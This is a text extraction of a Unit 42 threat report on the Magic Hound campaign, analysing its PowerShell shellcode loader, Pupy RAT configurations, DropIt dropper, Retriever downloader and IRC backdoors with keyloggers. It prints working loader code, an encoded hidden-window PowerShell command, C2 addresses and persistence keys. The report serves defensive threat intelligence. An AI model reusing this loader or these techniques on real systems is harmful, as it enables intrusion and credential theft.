[System.Convert]::FromBase64String($PEBytes0+$PEBytes1+$PEBytes2+$PEBytes3+$PEBytes4+$PEBytes5+$PEBytes6+$PEBytes7+$PEBytes8+$PEBytes9+$PEBytes10+$PEBytes11+$PEBytes12+$PEBytes13+$PEBytes14+$PEBytes15+$PEBytes16+$PEBytes17+$PEBytes18+$PEBytes19+$PEBytes20+$PEBytes21+$PEBytes22+$PEBytes23+$PEBytes24+$PEBytes25+$PEBytes26+$PEBytes27+$PEBytes28+$PEBytes29+$PEBytes30+$PEBytes31+$PEBytes32+$PEBytes33+$PEBytes34+$PEBytes35+$PEBytes36+$PEBytes37+$PEBytes38+$PEBytes39+$PEBytes40+$PEBytes41+$PEBytes42+$PEBytes43+$PEBytes44+$PEBytes45+$PEBytes46+$PEBytes47+$PEBytes48+$PEBytes49+$PEBytes50+$PEBytes51+$PEBytes52+$PEBytes53+$PEBytes54+$PEBytes55+$PEBytes56+$PEBytes57+$PEBytes58+$PEBytes59+$PEBytes60+$PEBytes61+$PEBytes62+$PEBytes63+$PEBytes64+$PEBytes65+$PEBytes66+$PEBytes67+$PEBytes68+$PEBytes69+$PEBytes70+$PEBytes71+$PEBytes72+$PEBytes73+$PEBytes74+$PEBytes75+$PEBytes76+$PEBytes77+$PEBytes78+$PEBytes79+$PEBytes80+$PEBytes81+$PEBytes82+$PEBytes83+$PEBytes84+$PEBytes85+$PEBytes86+$PEBytes87)1LAUNCHER_ARGS=['--host', '139.59.46[.]154:3543', '-t', 'obfs3'] 1open cmd.exe /c c:\\\\temp\\\\rr.exe SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spp.exe\" iexplore01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 20 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/SOFTWARE\\Microso$\\Windows\\CurrentVersion\\Run\\iexploreMany of the Fetch samples a!empted to obfuscate their func\"onality by encryp\"ng their embedded strings withAES using the same key \"agkrhfpdbvhdhrkj\"; however, the loader's main goal involved running the followingcommand:The base64 encoded command decodes to the following: The decoded command above builds a buﬀer that it uses to store shellcode and creates a thread to execute it. Wefound the command above within the source code of Magic Unicorn, which was also used in the Magic Hounddelivery documents. The shellcode executed by this command is the same as in the delivery documents as well,speciﬁcally taken from Metasploit to obtain addi\"onal shellcode to execute using an HTTP request to thefollowing URL:h!p:/ /www7.chrome-up[.]date/0m5EEWe are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide apayload. However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool toload a shellcode-based payload. The fact that the actor used Metasploit shellcode within the Unicorn generatedPowerShell script leads us to speculate that the ul\"mate payload of this a!ack is Meterpreter, which is ashellcode-based payload.PUPY LOADERPupy comes with default loaders that run the RAT on a variety of diﬀerent pla&orms, speciﬁcally Windows, OSX,Linux and  We have seen the Magic Hound actors using both the 32-bit and 64-bit DLL loaders that come withPupy to infect Windows systems. We have gathered three samples of the default loader associated with this groupand extracted the following conﬁgura\"ons:SHA256 of SampleConﬁgura!on82779504d3fa0ﬀc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190LAUNCHER_ARGS=['--host','www1.chrome-up[.]date:4443', '-t','obfs3']db453b8de1a01a3e4d963847c0a0a45'7e1a9b9e6d291c8883c74019f2fc91fLAUNCHER_ARGS=['--host','www1.chrome-up[.]date:4443', '-t','obfs3']7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73LAUNCHER_ARGS=['--host','139.59.46[.]154:3543', '-t', 'obfs3']1/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;1$0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = \"-enc \";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"&amp; $b32 $DKn $e\"}else{;iex \"&amp; powershell $DKn $e\";}01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 21 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ These conﬁgura\"ons show that this group uses both fully-qualiﬁed domain names and IP addresses to host theirPupy C2 servers. Also, the conﬁgura\"ons show the use of the “obfs3” (The Threebfuscator) transport, which is anobfusca\"on method to hide the true TCP-based communica\"ons protocol. The “obfs3” is used in the Tor projectand the speciﬁcs of this transport can be found at the Tor Project.MAGICHOUND.DROPITThe Magic Hound campaign was also discovered using a custom dropper tool, which we have namedMagicHound.DropIt.The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobsof base64 encoded data and concatena\"ng them together in the correct order. In all of the DropIt samples wecollected, the dropper will then save the executable to the user’s %TEMP% folder and execute the ﬁle, speciﬁcallyto one of the following ﬁlenames:%TEMP%\\spp.exe%TEMP%\\sloo.exe%TEMP%\\spoo.exe%TEMP%\\vschos.exeWe have also seen Magic Hound using DropIt like a binder Trojan, speciﬁcally dropping a legi\"mate decoyexecutable along with the malicious executable as a payload. For example, we analyzed a DropIt sample (SHA256:cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables,one of which was saved to “%TEMP%\\ﬂash_update.exe” that was a legi\"mate Flash Player installer. We believethe Magic Hound campaign uses the DropIt Trojan to run legi\"mate applica\"ons that ﬁt their social engineering,which in the example above included coercing the vic\"m into upda\"ng their Flash Player.MAGICHOUND.RETRIEVERWe observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level, Retriever is a.NET downloader that downloads secondary payloads from servers associated with Magic Hound. While theTrojan itself does not resemble the other Magic Hound tools, it does create a folder named \"c:\\temp\" that theMagic Hound loader creates to store its persistence executable, as previously discussed. The folder name is quitegeneric and by itself is not a great correla\"on point, however, this coupled with the shared infrastructure makes ahigher ﬁdelity connec\"on between the two.The Retriever Trojan uses the following namespace:using pcchekapp.grp.ammar.samaneh;Android.The malware begins by crea\"ng a web service object and uses the following URL within its conﬁgura\"on:h!p:/ / service.chrome-up[.]date:8080 /WebService.asmx01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 22 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/It then calls a func\"on called \"SetLog2\", which sets variables for the system's IP address, MAC address andhostname. A password variable is available but unused in this sample. The code will gather some informa\"onabout the system, speciﬁcally the local IP address, MAC address, and the external IP address of the system. Thecode obtains the external IP address via an HTTP request using to “h!p:/ /checkip.dyndns.org/” and uses a regularexpression to locate an IP address from the HTTP response.Once these variables are set, the malware uses the SoapH!pClientProtocol class to communicate with its C2server, which issues an HTTP POST requests that appears as: As you can see from the above request, the SoapH!pClientProtocol class neatly structures data into an HTTPPOST request. All subsequent interac\"on with the C2 server uses the same SOAP web service, so we will notshow all of the generated HTTP requests. Instead, we will refer to the speciﬁc SOAP ac\"on (see \"SOAPAc\"on\"ﬁeld in previous example, speciﬁcally \"SetLog2\") that the Trojan requests from the C2 server and the responsefrom the C2 server. A$er sending the C2 the system informa\"on, the malware then issues a second request for\"GetHasAnything\", which will communicate with the C2 server and ask the server if it has a secondary binary forthe Trojan to install.If the C2 server provides any response to the \"GetHasAnything\" request, it then calls the \"GetIdAbOne\" SOAPmethod to obtain what we believe is a unique iden\"ﬁer for the system that the Trojan will use for furtherinterac\"on with the C2. A$er receiving this variable, the Trojan calls the \"GetNameAbById\" to obtain a base64string that will be the ﬁlename wri!en in a newly created \"c:\\temp\" (decoded from \"YzpcdGVtcFw=\") folder. TheTrojan will then call \"GetAbById\",  which the C2 will provide a base64 string for the contents for the ﬁle to write toc:\\temp. A$er obtaining the unique ID from the C2 server, the Trojan calls the \"SetAbStatById\" method to no\"fythe C2 server of its status of \"1\" to no\"fy the server it had successfully received the ﬁlename and ﬁle data.With the ﬁle wri!en to the system, the Trojan calls the \"Ge\"shideAbById\" SOAP ac\"on to determine whether ornot the C2 server wishes to execute the newly dropped ﬁle in a hidden window. This request is followed by a callto \"Ge\"srunasAbById\" to determine if the Trojan should use \"runas\" to execute the downloaded executable withelevated privileges, which would display the UAC dialog for the user to click.Unfortunately, we were unable to obtain a secondary payload from an ac\"ve C2 server.MAGICHOUND.LEASHThe Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash.This tool was discovered when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2communica\"ons. The bot chooses a random name from 977 hardcoded possibili\"es, connects to an adversaryowned IRC server and joins a channel using the following IRC commands:01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 23 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/USER AS_a # # :desNICK ConroyJOIN :#kalkLeash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also beconnected to the IRC server. The following commands are available:CommandSubCommandDescrip!onVERGenerates the following IRC client command that will be sent to the C2 server: PRIVMSG <username> :    8 LED= 20160124KILLTrojan disconnects from the IRC server and terminates itselfRESETTrojan disconnects from the IRC server and runs the executable againOSObtains the Windows version and responds to the C2 with the following message\"PRIVMSG <username> :<one of the following version strings>\": Windows NTWindows 95Windows 98Windows MEWindows 2003Windows XPWindows 7Windows VistaUnkown os info!SHEXECNot supportedMDCreates a speciﬁed directory. The Trojan will respond to the C2 with \"PRIVMSG<username> : <message> [<speciﬁed path>]\". The message sent to the C2 will be \"dir ismaked.\" if successful or \"dir is not maked\" if unsuccessful.MKDIRSame as MD subcommand.RDRemoves a speciﬁed directory. The Trojan will respond to the C2 with \"PRIVMSG<username> : <message> [<speciﬁed path>]\". The message sent to the C2 will be \"dir isremoved.\" if successful or \"dir is not removed.\" if unsuccessful.DELDeletes a speciﬁed ﬁle. The Trojan will respond to the C2 with \"PRIVMSG <username> :<message> [<speciﬁed path>]\". The message sent to the C2 will be \"ﬁle is deleted.\" ifsuccessful or \"ﬁle is not deleted.\" if unsuccessful.COPYNot supported.MOVENot supported.RENRenames a speciﬁed ﬁle. The Trojan will respond to the C2 with \"PRIVMSG <username> :<message> [<speciﬁed path>]\". The message sent to the C2 will be \"ﬁle is renamed.\" ifsuccessful or \"ﬁle is not renamed.\" if unsuccessful.DRIVELists the logical drives and the type, as well the total/free space of the ﬁxed devices.EXECalls GetModuleFileNameA func\"on to obtain the path to the currently runningexecutable and sends it to the C2 server.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 24 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/!DWNDownloads a ﬁle from a speciﬁed URL. Responds to the IRC server via PRIVMSG with“Download  Success :FilePath=<path to downloaded ﬁle>” or “Download Fail” ifunsuccessful.!CMDTrojan executes a command prompt command. The Trojan will save the output of thecommand to %TEMP%\\win<random number>.txt and send the contents to the C2 serveror \"The length of Cmd result ﬁle is ziro!\" if the command was unsuccessful.SAGenerates the following IRC client command that will be sent to the C2 server:PRIVMSG <username> : Hello ,my name is  <IRC USER name>, Im ready my ComputerName is:<computer name> All of the commands, except for the VER command, must be issued by individuals in the IRC channel withnicknames that start with \"AS_\" or \"AF_\". This suggests that the adversary’s IRC nickname would need to havethese preﬁxes to control the systems infected with this Trojan. The adversary could have used this namerequirement as an added measure to make sure other individuals did not join the IRC server and begin interac\"ngwith compromised systems. 01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 25 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ 01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 26 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ 01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 27 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ MPKBot01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 28 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/We also found a second IRC bot called MPK (SHA256:d08d737fa59edbea4568100cf83cﬀ7bf930087aaa640f1b4edf48eea4e07b19) using an IP that a Retriever samplewas hosted on as a C2 server instead. This MPK IRC bot is very similar to the MPK Trojan that used a custom C2communica\"ons protocol, as discussed in the whitepaper by CheckPoint discussing a threat group called RocketKi!en. We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and theone discussed in the above white paper have considerable similari\"es from a behavior standpoint and both Trojanhave direct code sharing between them.From a behaviorial standpoint, both the IRC and custom protocol version of MPK save \"tmp.vbs\" and \"tmp1.vbs\"to the %TEMP% folder (both diﬀered slightly but used the same variable names within the script) in order to copythe Trojan to its ﬁnal loca\"on and to execute it. Both variants need to be executed with the command lineargument \"[2]\" to avoid con\"nually a!emp\"ng to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs”ﬁles. The two variants of MPK share the same registry key that the Trojan uses to automa\"cally run each \"me thesystem starts, speciﬁcally:[HKLM and HKCU]\\SOFTWARE\\Microso$\\Windows\\CurrentVersion\\Run\\explorerBoth MPK variants include key loggers that are extremely similar in func\"onality in addi\"on to having the samestrings used for headers within the key log ﬁle. The MPK IRC Bot monitors ac\"ve applica\"on windows and writesthe \"tle of the open window along with the logged keystrokes to a ﬁle at “%temp%\\Save.tmp”. The MPK Trojanalso monitors speciﬁcally for windows that are likely to contain login forms for popular web-based email clients,such as \"tles that contain:\"Gmail -\"\"Yahoo - login\"\"Sign In -\"“Outlook.com -\"MPK will a!empt to parse these window \"tles to iden\"fy the associated email address and record these to the logﬁle using the following format://///////////Mail Find <email address>///////////If the Trojan does not ﬁnd the window \"tles associated with Gmail, Yahoo or Outlook, it saves the \"tle to the\"Save.tmp\" ﬁle in the following format:+++++++++++++Window= <window \"tle>+++++++++++++The major diﬀerence between the IRC variant and non-IRC variant of MPK is the C2 protocol used. The IRCvariant creates a mutex named “mpk1” and a!empts to connect to an IRC server at 45.58.37[.]142:6667. TheMPK bot generates a random lowercase name and uses it to log into the IRC server. It then sends the followingIRC commands:NICK bxphzrjbxpUSER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 29 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server a$erthe bot connects:Welcome to the MpkNet IRC NetworkThe MPK bot does not join a speciﬁc IRC channel, instead sending private messages (PRIVMSG) to a user with thenick \"mpk\". A$er connec\"ng to the IRC server, the MPK bot sends custom ping messages and provides anintroduc\"on via a “!Hello” message that contains the current logged in user of the infected host, if the user hasadministrator privileges, the hostname, the UUID of the system, and opera\"ng system version. Figure 7 shows theini\"al private messages sent from the MPK bot to the “mpk” account on the C2 server. Figure 7 Ini!al private messages sent from MPK to the IRC C2 serverThe commands available within the MPK IRC bot are called via a jump table, rather than a switch statement usedin the custom protocol variant of MPK. The IRC variant of MPK has a command set (Table 2) that makes this aneﬀec\"ve backdoor Trojan, speciﬁcally allowing the actors to steal creden\"als from the targeted system viakeylogging, to navigate and interact with the ﬁle system, to run arbitrary commands, and to download and executeaddi\"onal tools on the system.CommandDescrip!on!DirLists the contents of a speciﬁed directory!DrivesEnumerates the storage drives a!ached to the system and their respec\"ve type.!DeleteFileDeletes a speciﬁed ﬁle!NickChangeChanges the nickname that the Trojan uses to log into the C2 IRC server. Writes it to\"nick435.tmp\" for subsequent logins.!ProcessListList running processes, including their PID, parent PID, executable name and priority!SendFileToServerUploads a speciﬁed ﬁle to the C2 server!CaptureScreenTakes a screenshot that it saves to a ﬁle and uploads to the C2 server.!HelloThe Trojan introduces itself by sending the current username, if its an admin account or not, thecomputer name, the system UUID and the OS version.!ProcessKillTerminates a process based on PID!RenameFileFolderRenames a ﬁle or folder and returns a list of the containing folder to the C2 server.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 30 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/!GetFileOfServerWrites a ﬁle from the C2 server to a speciﬁed ﬁle!ExecuteCommandUses the command prompt sub-process to execute commands and returns their results to theC2.!ExeCuteFileExecutes a speciﬁed ﬁle using ShellExecuteA!DeleteFileFolderDeletes a ﬁle or a folder!SendkeyLogToServerUploads the %TEMP%\\Save.tmp ﬁle to the C2 server!DeleteKeyloggerLogDeletes the %TEMP%\\Save.tmp ﬁle on the systemTable 2 Commands available within MPK IRC Bot Get updates from Palo Alto Networks!Sign up to receive the latest news, cyber threat intelligence and research from usEmail addressSubscribe reCAPTCHANon sono un robotPrivacy - TerminiBy submi(ng this form, you agree to our Terms of Use and acknowledgeour Privacy Statement.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 31 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/  2024 Palo Alto Networks, Inc. All rights reserved.Popular ResourcesResource CenterBlogCommuni\"esTech DocsUnit 42SitemapLegal NoticesPrivacyTerms of UseDocumentsAccountManage Subscrip\"onsReport a Vulnerability"
}